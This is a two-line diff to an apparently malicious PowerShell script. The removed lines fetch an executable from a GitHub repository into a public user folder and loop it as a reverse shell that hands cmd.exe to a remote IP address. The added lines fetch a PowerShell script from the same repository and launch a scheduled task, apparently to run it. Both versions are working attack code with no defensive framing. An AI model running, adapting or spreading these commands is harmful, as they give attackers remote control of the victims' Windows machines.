@@ -1,2 +1,2 @@
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/RNM.exe -OutFile C:\Users\Public\RNM.exe
-while ($true){C:\Users\Public\RNM.exe -nv 193.161.193.99 54987 -e cmd.exe ; Start-Sleep 7}
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/My.ps1 -OutFile C:\Users\Public\My.ps1
+Start-ScheduledTask -TaskName zed
